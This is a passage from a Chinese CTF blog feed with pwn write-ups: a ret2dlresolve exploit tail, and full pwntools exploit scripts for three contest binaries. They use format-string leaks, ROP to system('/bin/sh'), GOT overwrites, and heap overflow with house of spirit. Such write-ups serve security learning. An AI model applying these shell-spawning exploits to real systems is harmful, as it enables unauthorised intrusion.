0x00000012</span></div><div class="line">    addr += <span class="built_in">len</span>(payload2)</div><div class="line">    payload1 = <span class="built_in">offset</span> * <span class="string">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(addr) + p32(<span class="number">100</span>)</div><div class="line">    p.sendline(payload1)</div><div class="line">    off = addr - dynstr_addr + <span class="number">0x10</span></div><div class="line">    print <span class="string">'offset_dynstr =&gt; '</span>, hex(off) <span class="comment"># 15f0</span></div><div class="line">    payload2 = p32(off) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</div><div class="line"><span class="comment">#    gdb.attach(p, open('debug'))</span></div><div class="line">    p.sendline(payload2)</div><div class="line"></div><div class="line">    <span class="comment"># fake .dynstr</span></div><div class="line">    addr += <span class="built_in">len</span>(payload2)</div><div class="line">    payload1 = <span class="built_in">offset</span> * <span class="string">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(addr) + p32(<span class="number">100</span>)</div><div class="line">    p.sendline(payload1)</div><div class="line"><span class="comment">#    gdb.attach(p, open('debug'))</span></div><div class="line">    payload2 = <span class="string">'system\x00'</span></div><div class="line">    p.sendline(payload2)</div><div class="line"><span class="comment">#    gdb.attach(p, open('debug'))</span></div><div class="line"></div><div class="line">    <span class="comment"># fake reloc_args &amp; mov eip, plt[0]</span></div><div class="line">    reloc_args = bss_addr - relplt_addr + <span class="number">0x14</span></div><div class="line">    print <span class="string">'reloc_args =&gt; '</span>, hex(reloc_args)</div><div class="line">    gdb.attach(p, <span class="built_in">open</span>(<span class="string">'debug'</span>))</div><div class="line">    payload1 = <span class="built_in">offset</span> * <span class="string">'a'</span> + p32(plt_addr) + p32(reloc_args) + p32(elf.plt[<span class="string">'fflush'</span>]) + p32(vuln_addr) + p32(bss_addr)</div><div class="line">    p.sendline(payload1)</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
<p>最后在控制<code>eip</code>到<code>plt[0]</code>的位置时，我遇到了传参的问题，当我将<code>reloc_adgs</code>压入栈中后，我无法将将要调用函数<code>fflush()(事实上是systm())</code>的参数<code>/bin/sh\x00</code>压入栈中了，这里可能需要用到rop去控制esp和栈的内容，暂时先不去研究这个。</p>
<h3 id="其他可能的利用？"><a href="#其他可能的利用？" class="headerlink" title="其他可能的利用？"></a>其他可能的利用？</h3><p>当我们可以控制<code>.dynamic</code>后是否可以改变别的值去控制程序（连接器？）解析到其他的地址上，是否还有其他的利用方式？</p>
<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>关于64位的利用方式应该是差不多的，暂时没精力研究了，先挖坑，以后填吧，先去研究沙盒了。</p>
<h2 id="叹"><a href="#叹" class="headerlink" title="叹"></a>叹</h2><p>还是太菜了，弄明白个这个玩意都要花接近一天。。。。TAT</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy bi
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="stack" scheme="http://reehy.top/tags/stack/"/>
    
      <category term="ret2dlresolve" scheme="http://reehy.top/tags/ret2dlresolve/"/>
    
  </entry>
  
  <entry>
    <title>Pwn中的沙盒</title>
    <link href="http://reehy.top/2017/04/11/Pwn%E4%B8%AD%E7%9A%84%E6%B2%99%E7%9B%92/"/>
    <id>http://reehy.top/2017/04/11/Pwn中的沙盒/</id>
    <published>2017-04-11T05:38:09.000Z</published>
    <updated>2017-04-11T05:39:09.088Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是沙盒"><a href="#什么是沙盒" class="headerlink" title="什么是沙盒"></a>什么是沙盒</h2><p>来来来，开个坑，以后慢慢填</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;什么是沙盒&quot;&gt;&lt;a href=&quot;#什么是沙盒&quot; class=&quot;headerlink&quot; title=&quot;什么是沙盒&quot;&gt;&lt;/a&gt;什么是沙盒&lt;/h2&gt;&lt;p&gt;来来来，开个坑，以后慢慢填&lt;/p&gt;

    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="sandbox" scheme="http://reehy.top/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>2017.4.8Pwn</title>
    <link href="http://reehy.top/2017/04/11/2017-4-8Pwn-1/"/>
    <id>http://reehy.top/2017/04/11/2017-4-8Pwn-1/</id>
    <published>2017-04-10T23:28:28.000Z</published>
    <updated>2017-04-11T00:31:41.542Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>简单的一些线下赛的pwn题吧，可能因为线下赛时间短，所以题目没有特别变态的，简单记录，还是学到了不少东西的。</p>
<h2 id="ropprintf"><a href="#ropprintf" class="headerlink" title="ropprintf"></a>ropprintf</h2><p>两个洞，栈溢出和fsb，稍加利用即可。这里主要是存在64位的问题，64位的的传参顺序是先用六个寄存器，然后才到栈上存数据。所以<code>%7$lx</code>才会打印出栈上的数据；同时<code>x</code>与<code>lx</code>的区别，分别是4byte与8byte长度。相同的还有<code>n</code>这个格式化符号，<code>n</code>是写到对应内存的4个byte里，<code>ln</code>是写到对应内存的8byte里。</p>
<p>然后还要注意，不同机器上的libc可能不一样，同时大多数都是以<code>0</code>对齐的，所以可能需要猜一猜。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env <span class="keyword">python</span></div><div class="line"># coding=utf-<span class="number">8</span></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line">local = <span class="number">1</span></div><div class="line"><span class="keyword">debug</span> = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> slo<span class="variable">g:</span> context(log_level = <span class="string">'debug'</span>, terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>])</div><div class="line"><span class="keyword">if</span> loca<span class="variable">l:</span></div><div class="line">    <span class="keyword">p</span> = process(<span class="string">'./ropprintf'</span>)</div><div class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">p</span> = remote(<span class="string">'172.16.1.1'</span>, <span class="number">20000</span>)</div><div class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">#if local <span class="built_in">and</span> debu<span class="variable">g:</span></div><div class="line">#    gdb.attach(<span class="keyword">p</span>, <span class="keyword">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./ropprintf'</span>)</div><div class="line"></div><div class="line">offset = <span class="number">22</span></div><div class="line"></div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]</div><div class="line"></div><div class="line">payload1 = <span class="string">'%11$lx'</span></div><div class="line">pop_ret = <span class="number">0</span>x0000000000400703 # <span class="keyword">pop</span> rdi, <span class="keyword">ret</span></div><div class="line"><span class="keyword">p</span>.recvuntil(<span class="string">'something\n'</span>)</div><div class="line">gdb.attach(<span class="keyword">p</span>)</div><div class="line"><span class="keyword">p</span>.sendline(payload1)</div><div class="line">libc_start_main_addr = <span class="keyword">int</span>(<span class="keyword">p</span>.recvline(), <span class="number">16</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">'libc_start =&gt; '</span>, hex(libc_start_main_addr)</div><div class="line"></div><div class="line">libc.address = libc_start_main_addr - <span class="number">240</span> - libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">'system_addr =&gt; '</span>, hex(system_addr)</div><div class="line">binsh_addr = libc.<span class="built_in">search</span>(<span class="string">'/bin/sh'</span>).<span class="keyword">next</span>()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">8</span>):</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'something\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(<span class="string">'1'</span>)</div><div class="line"># gdb.attach(<span class="keyword">p</span>)</div><div class="line">payload2 = <span class="string">'a'</span> * offset + p64(pop_ret) + p64(binsh_addr) + p64(system_addr)</div><div class="line"><span class="keyword">p</span>.sendline(payload2)</div><div class="line"><span class="keyword">p</span>.interactive()</div></pre></td></tr></table></figure>
<h2 id="easyprintf"><a href="#easyprintf" class="headerlink" title="easyprintf"></a>easyprintf</h2><p>最直接的fsb。程序开了<code>PIE</code>，可以通过直接打印得到<code>elf.address</code>和<code>libc.address</code>。由于传参方式不一样，所以能用传统的方式去写，这里我是用的<code>UAF</code>，因为我们可以控制栈上的内容，所以可以提前将想要写入的地址布置在栈上，然后再用fsb的<code>hhn</code>和<code>hn</code>分字节去修改。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line"><span class="keyword">local</span> = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>, terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>, <span class="string">'-h'</span>])</div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span>:</div><div class="line">    p = process(<span class="string">'./easyprintf'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="keyword">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./easyprintf'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"></div><div class="line"><span class="comment"># leak libc_base &amp; elf_base</span></div><div class="line">payload1 = <span class="string">'%9$lx-%38$lx'</span></div><div class="line">p.recvuntil(<span class="string">'something\n'</span>)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line">p.sendline(payload1)</div><div class="line">addr = p.recvline()[:-<span class="number">1</span>].<span class="keyword">split</span>(<span class="string">'-'</span>)</div><div class="line">libc.address = <span class="keyword">int</span>(addr[<span class="number">0</span>], <span class="number">16</span>) - <span class="number">0x18ba47</span></div><div class="line">elf.address = <span class="keyword">int</span>(addr[<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x8d0</span></div><div class="line"><span class="keyword">print</span> <span class="string">'elf_base =&gt; '</span>, <span class="keyword">hex</span>(elf.address)</div><div class="line"><span class="keyword">print</span> <span class="string">'libc_address =&gt; '</span>, <span class="keyword">hex</span>(libc.address)</div><div class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</div><div class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next()</div><div class="line"><span class="keyword">print</span> <span class="string">'system_addr =&gt; '</span>, <span class="keyword">hex</span>(system_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">'binsh_addr =&gt; '</span>, <span class="keyword">hex</span>(binsh_addr)</div><div class="line">printf_addr = <span class="keyword">hex</span>(libc.symbols[<span class="string">'printf'</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">'printf_addr =&gt; '</span>, printf_addr</div><div class="line"></div><div class="line"><span class="comment"># UAF</span></div><div class="line">printf_got = elf.got[<span class="string">'printf'</span>]</div><div class="line"><span class="keyword">print</span> <span class="string">'printf_got =&gt; '</span>, <span class="keyword">hex</span>(printf_got)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line">payload2 = <span class="string">'a'</span> * (<span class="number">0x100</span> - <span class="number">0x10</span>) + p64(printf_got + <span class="number">0x2</span>)  + p64(printf_got)</div><div class="line"><span class="keyword">print</span> payload2</div><div class="line">p.recvuntil(<span class="string">'something\n'</span>)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line">p.sendline(payload2)</div><div class="line"></div><div class="line"><span class="comment"># edit printf_got to system_addr</span></div><div class="line">offset = <span class="keyword">int</span>(printf_addr[-<span class="number">6</span>:-<span class="number">4</span>], <span class="number">16</span>) - <span class="number">1</span></div><div class="line"><span class="keyword">print</span> <span class="keyword">hex</span>(offset)</div><div class="line">offset1 = <span class="keyword">int</span>(<span class="keyword">hex</span>(system_addr - libc.address)[<span class="number">4</span>:], <span class="number">16</span>) + <span class="keyword">int</span>(str(printf_addr)[-<span class="number">4</span>] + <span class="string">'000'</span>, <span class="number">16</span>)</div><div class="line"><span class="keyword">print</span> <span class="keyword">hex</span>(offset1)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line">payload3 = <span class="string">'%&#123;&#125;x'</span>.format(offset) + <span class="string">'%36$hhn'</span></div><div class="line">payload3 += <span class="string">'%&#123;&#125;x'</span>.format(offset1 - offset) + <span class="string">'%37$hn'</span></div><div class="line"><span class="comment"># payload3 = '%37$lx'</span></div><div class="line">p.recvuntil(<span class="string">'something\n'</span>)</div><div class="line">p.sendline(payload3)</div><div class="line"></div><div class="line"><span class="comment"># getshell</span></div><div class="line">p.recvuntil(<span class="string">'something\n'</span>)</div><div class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="book"><a href="#book" class="headerlink" title="book"></a>book</h2><p>一个简单的堆的题目。由于程序在每次<code>add()</code>时候都会申请一个相应大小的<code>fastbin</code>和<code>smallbin</code>，释放时<code>fastbin</code>放到对应链表中，<code>smallbin</code>放到<code>unsortbin</code>链表中。其中<code>feedback()</code>没有检查堆的长度，修改可造成堆溢出。</p>
<p><code>feedback()</code><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">_<span class="function">BYTE *<span class="title">feedback</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  _BYTE *result; <span class="comment">// rax@7</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [sp+8h] [bp-8h]@1</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  v1 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">3</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( auther_name_array[<span class="number">5</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] &amp;&amp; feedback_array[<span class="number">5</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] )</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"feedback of book%d is %s\n"</span>, i, feedback_array[<span class="number">5</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i]);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Which book do you want to modify the feedback?"</span>);</div><div class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</div><div class="line">  result = (_BYTE *)v1;</div><div class="line">  <span class="keyword">if</span> ( (v1 &amp; <span class="number">0x80000000</span>) == <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    result = (_BYTE *)v1;</div><div class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">3</span> )</div><div class="line">    &#123;</div><div class="line">      result = (_BYTE *)feedback_array[<span class="number">5</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)v1];</div><div class="line">      <span class="keyword">if</span> ( result )</div><div class="line">        result = read_feadback(feedback_array[<span class="number">5</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)v1]);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这个函数不仅会造成堆溢出，还可用来泄露一些地址。<br>简单观察可以发现<code>fastbin</code>的链表可以通过堆溢出修改，也就是说我们可以使用<code>house_of_spirit</code>来分配得到一个指向bss段的chunk，然后修改<code>feedback_array[]</code>这个指针数组，并通过<code>feedback()</code>来泄露libc的地址。<br>但是还要找到一个bss上的<code>0x10,0x20,0x30...</code>的数字才能构造，事实上bss上存有<code>feedback_length[]</code>这个数组，我们可以通过<code>UAF</code>去得到一个数字即可。</p>
<p><code>bss</code>段数据：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00 _bss            segment para <span class="keyword">public</span> <span class="string">'BSS'</span> use64</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00                 assume <span class="string">cs:</span>_bss</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00                 ;org <span class="number">601</span>D00h</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00                 assume <span class="string">es:</span>nothing, <span class="string">ss:</span>nothing, <span class="string">ds:</span>_data, <span class="string">fs:</span>nothing, <span class="string">gs:</span>nothing</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00                 <span class="keyword">public</span> stdin</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00 ; FILE *stdin</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00 stdin           dq ?                    ; DATA XREF: main+<span class="number">17</span>r</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D00                                         ; Copy of shared data</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D08                 align <span class="number">10</span>h</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D10                 <span class="keyword">public</span> stdout</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D10 ; FILE *stdout</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D10 stdout          dq ?                    ; DATA XREF: main+<span class="number">35</span>r</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D10                                         ; Copy of shared data</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D18 byte_601D18     db ?                    ; DATA XREF: sub_400850+<span class="number">9</span>r</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D18                                         ; <span class="string">sub_400850:</span>loc_4008A6w</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D19                 align <span class="number">20</span>h</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D20 qword_601D20    dq ?                    ; DATA XREF: sub_400850+<span class="number">17</span>r</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D20                                         ; sub_400850+<span class="number">3</span>Cw ...</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D28                 align <span class="number">20</span>h</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D40 ; <span class="keyword">int</span> dword_601D40[]</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D40 dword_601D40    dd ?                    ; DATA XREF: random+<span class="number">115</span>r</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D40                                         ; add+<span class="number">71</span>w</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D44                 align <span class="number">8</span></div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D48 ; __int64 index_array[]</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D48 index_array     dq ?                    ; DATA XREF: add+<span class="number">9</span>Aw</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D48                                         ; exchange+C5r ...</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D50 ; __int64 feedback_length[]</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D50 feedback_length dq ?                    ; DATA XREF: add+<span class="number">19</span>Fw</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D50                                         ; sub_400F67+BBr ...</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D58 ; __int64 auther_name_array[]</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D58 auther_name_array dq ?                  ; DATA XREF: add+D9w</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D58                                         ; add+F7r ...</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D60 ; __int64 feedback_array[]</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D60 feedback_array  dq ?                    ; DATA XREF: random+F3r</div><div class="line">.<span class="string">bss:</span><span class="number">0000000000601</span>D60                                         ; random+<span class="number">235</span>r ...</div></pre></td></tr></table></figure></p>
<p>所以我的思路如下：</p>
<ol>
<li>通过一定的堆排布，是的<code>fastbin</code>在地址上连续，使得堆溢出可以修改相邻堆块的指针。</li>
<li>在堆排布的同时申请一个长度为<code>0x20</code>的feedback，使得<code>0x20</code>用来我们以后伪造<code>fastbin</code>并分配来用。</li>
<li>通过堆溢出修改相邻已经<code>free</code>了的<code>fastbin</code>，修改指针使其指向我们刚才已经伪造的bss上的地址。</li>
<li>修改<code>freeback_array[]</code>，使一个指针为<code>atoi_got</code>。</li>
<li>再次使用<code>feedback()</code>泄露<code>atoi</code>，并计算libc得到<code>system</code>，并修改<code>atoi_got</code>为<code>system</code>。</li>
<li>getshell</li>
</ol>
<p>exp：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env <span class="keyword">python</span></div><div class="line"># coding=utf-<span class="number">8</span></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line">local = <span class="number">1</span></div><div class="line"><span class="keyword">debug</span> = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> slo<span class="variable">g:</span> context(log_level = <span class="string">'debug'</span>)#, terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>])</div><div class="line"><span class="keyword">if</span> loca<span class="variable">l:</span></div><div class="line">    <span class="keyword">p</span> = process(<span class="string">'./book'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">p</span> = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> local <span class="built_in">and</span> debu<span class="variable">g:</span></div><div class="line">    gdb.attach(<span class="keyword">p</span>, <span class="keyword">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">bss = <span class="number">0</span>x0000000000601D00</div><div class="line">elf = ELF(<span class="string">'./book'</span>)</div><div class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"></div><div class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</div><div class="line"></div><div class="line">def <span class="built_in">add</span>(author, length, feedback):</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'!!\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(str(<span class="number">2</span>))</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'author:\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(author)</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'it?\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(str(length))</div><div class="line">    <span class="keyword">p</span>.sendline(feedback)</div><div class="line"></div><div class="line">def <span class="keyword">delete</span>(<span class="built_in">index</span>):</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'!!\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(str(<span class="number">3</span>))</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'book?\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(str(<span class="built_in">index</span>))</div><div class="line"></div><div class="line"></div><div class="line">def feedback(<span class="built_in">index</span>, feedback):</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'!!\n'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(str(<span class="number">4</span>))</div><div class="line">    <span class="keyword">p</span>.recvuntil(<span class="string">'feedback?'</span>)</div><div class="line">    <span class="keyword">p</span>.sendline(str(<span class="built_in">index</span>))</div><div class="line">    <span class="keyword">p</span>.sendline(feedback)</div><div class="line"></div><div class="line">def pwn():</div><div class="line"># use UAF <span class="keyword">to</span> exploit house_of_spirit </div><div class="line"># UAF</div><div class="line">    <span class="built_in">add</span>(str(<span class="number">0</span>), <span class="number">0</span>x30, <span class="string">'a'</span>)</div><div class="line">    <span class="keyword">delete</span>(<span 